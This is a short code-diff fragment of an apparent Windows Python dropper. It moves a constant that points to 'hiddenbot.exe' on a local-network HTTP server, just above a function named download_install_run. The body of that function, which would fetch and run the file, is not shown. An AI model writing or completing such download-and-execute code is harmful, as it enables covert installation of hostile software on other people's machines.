@@ -5,8 +5,8 @@ import win32con
 
 from win32com.shell import shell
 
-CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
 global chatboturl
+CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
 
 def download_install_run(url, specialpath, fname):
     #Get a path for the file and unhide it.
